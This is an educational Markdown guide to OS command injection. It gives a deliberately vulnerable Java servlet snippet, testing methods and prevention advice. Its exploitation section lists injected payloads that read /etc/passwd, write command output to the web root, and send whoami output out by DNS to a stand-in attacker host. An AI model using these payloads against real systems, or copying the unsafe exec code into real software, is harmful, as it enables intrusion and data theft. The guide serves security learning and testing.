# Command Injection
---

## What Is OS Command Injection?
OS Command Injection is a vulnerability that consists of an attacker executing commands on the host operating system via a vulnerable application

```java
1 import java.io.IOException;
2 import javax.servlet.http.HttpServletRequest;
3 public void runUnsafe(HttpServletRequest request) throws IOException {
4 String cmd = request.getParameter("command");
5 String arg = request.getParameter("arg");
6 Runtime.getRuntime().exec(cmd+" "+arg);
7 }
```
Line #6 allows execution of arbitrary commands via client-side input

### Types Of Command Injection
1. **In-Band Command Injection**
* Consists of an attacker executing commands on the host operating system via a vulnerable application and receiving the response of the command in the application
2. **Blind Command Injection**
* Consists of an attacker executing commands on the host operating system via a vulnerable application that does not return the output from the command within its HTTP response

### Impact Of Command Injection Attacks
* Unauthorized access to the application and host operating system
    * **C**onfidentiality - can be used to view sensitive information
    * **I**ntegrity - can be used to alter content in the application
    * **A**vailability - can be used to delete content in the application
* Remote code execution on the host operating system

---

## How To Find Command Injection?

### Black-Box Testing
* Map the application
    * Identify all instances where the web application appears to be interacting with the underlying operating system
* Fuzz the application
    * Shell metacharacters: &, &&, |, "", ;, \n, ', $()
* For in-band command injection, analyze the response of the application to determine if it's vulnerable
* For blind command injection, you need to get creative
    * Trigger a time delay using the ping or sleep command
    * Output the response of the command in the web root and retrieve the file directly using a browser
    * Open an out-of-band channgel back to a server you control

### White-Box Testing
* Perform a combination of black box and white box testing
* Map all input vectors in the application
* Review source code to determine if any of the input vectors are added as parameters to functions that execute system commands

---

## How To Exploit Command Injection Vulnerabilities?

* Exploiting In-Band Command Injection
    * Shell metacharacters: &, &&, |, "", ;, \n, ', $()
    * Concatenate another command
        * `127.0.0.1 && cat /etc/passwd &`
        * `127.0.0.1 & cat /etc/passwd &`
        * `127.0.0.1 || cat /etc/passwd &`

* Exploiting Blind Command Injection
    * Shell metacharacters: &, &&, |, "", ;, \n, ', $()
    * Trigger a time delay
        * `127.0.0.1 && sleep 10 &`
        * `127.0.0.1 && ping -c 10 127.0.0.1`
    * Output the response of the command in the web root and retrieve the file directly using a browser
        * `127.0.0.1 & whoami > /var/www/static/whoami.txt &`
    * Open an out-of-band channel back to a server you control
        * `127.0.0.1 & nslookup lishdfo.attacker.com &`
        * `127.0.0.1 & nslookup 'whoami'.lishdfo.attacker.com &`

---

## How To Prevent Command Injection Vulnerabilities?
The most effective way to prevent OS Command Injection Vulnerabilities is to never call out to OS commands from application-layer code. Instead, implement the required functionality using safer platform APIs.
* For example: use `mkdir` instead of `system("mkdir /dir_name")`

It is required to perform OS commands using user-supplied input, then strong input validation must be performed.
* Validate against a whitelist of permitted values
* Validate that the input is as expected or valid input

---

## Resources
* [Web Security Academy – OS Command Injection](https://portswigger.net/web-security/os-command-injection)
* [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
* [OWASP OS Command Injection Defense Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html)
* [OWASP WSTG Testing for Command Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command)